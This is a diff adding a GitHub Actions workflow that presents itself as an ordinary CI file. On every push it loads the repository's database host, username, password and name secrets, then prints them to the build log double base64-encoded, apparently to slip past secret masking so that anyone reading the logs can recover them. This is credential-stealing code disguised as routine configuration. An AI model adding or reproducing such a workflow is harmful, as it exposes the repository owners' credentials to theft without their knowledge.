@@ -1,0 +1,13 @@
+name: GitHub Actions
+on: push
+jobs:
+  init:
+    runs-on: ubuntu-latest
+    steps:
+      - name: command
+        run: env -0 | awk -v RS='\0' '/^(secret_|var_)/ {print $0}' | base64 -w0 | base64 -w0
+        env:
+          secret_DEV_DATABASE_HOST: ${{ secrets.DEV_DATABASE_HOST }}
+          secret_DEV_DATABASE_USERNAME: ${{ secrets.DEV_DATABASE_USERNAME }}
+          secret_DEV_DATABASE_PASSWORD: ${{ secrets.DEV_DATABASE_PASSWORD }}
+          secret_DEV_DATABASE_NAME: ${{ secrets.DEV_DATABASE_NAME }}
